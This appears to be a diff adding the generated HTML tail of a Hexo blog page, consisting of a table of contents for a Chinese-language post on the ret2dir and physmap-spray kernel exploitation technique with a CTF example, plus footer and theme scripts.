+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">ret2dir &amp; physmap spray</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dir-physmap-spray"><span class="nav-text">ret2dir &amp; physmap spray</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-pt-regs"><span class="nav-text">利用 pt_regs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98MINI-LCTF2022-kgadget"><span class="nav-text">例题MINI-LCTF2022 - kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gadget"><span class="nav-text">gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%83%AD%E8%BA%AB%E7%8E%AF%E8%8A%82"><span class="nav-text">热身环节</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%96%91%E9%97%AE"><span class="nav-text">疑问</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
